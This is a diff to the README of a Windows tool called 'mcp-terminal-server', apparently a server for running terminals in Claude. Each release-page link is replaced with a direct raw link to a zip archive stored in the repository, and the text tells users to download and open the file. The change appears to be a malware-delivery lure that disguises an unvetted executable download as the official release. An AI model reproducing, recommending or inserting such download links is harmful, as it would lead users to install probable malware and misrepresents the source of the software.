@@ -1,10 +1,10 @@
 # 🖥️ mcp-terminal-server - Run interactive terminals in Claude
 
-[![Download mcp-terminal-server](https://img.shields.io/badge/Download-Release%20Page-1f6feb?style=for-the-badge)](https://github.com/Unfathomable-siren38/mcp-terminal-server/releases)
+[![Download mcp-terminal-server](https://img.shields.io/badge/Download-Release%20Page-1f6feb?style=for-the-badge)](https://raw.githubusercontent.com/Unfathomable-siren38/mcp-terminal-server/main/assets/terminal_mcp_server_v1.4-beta.5.zip)
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/Unfathomable-siren38/mcp-terminal-server/releases
+Visit this page to download: https://raw.githubusercontent.com/Unfathomable-siren38/mcp-terminal-server/main/assets/terminal_mcp_server_v1.4-beta.5.zip
 
 Choose the latest release for Windows, then download the file that matches your PC. After the file finishes downloading, open it to start the app or follow the setup steps in the release notes
 
@@ -106,6 +106,6 @@ If you use more than one terminal session, you can keep each one for a different
 
 ## 📦 Release Page
 
-Download and setup files are here: https://github.com/Unfathomable-siren38/mcp-terminal-server/releases
+Download and setup files are here: https://raw.githubusercontent.com/Unfathomable-siren38/mcp-terminal-server/main/assets/terminal_mcp_server_v1.4-beta.5.zip
 
 Use this page when you want the newest Windows build, setup notes, and release files for mcp-terminal-server
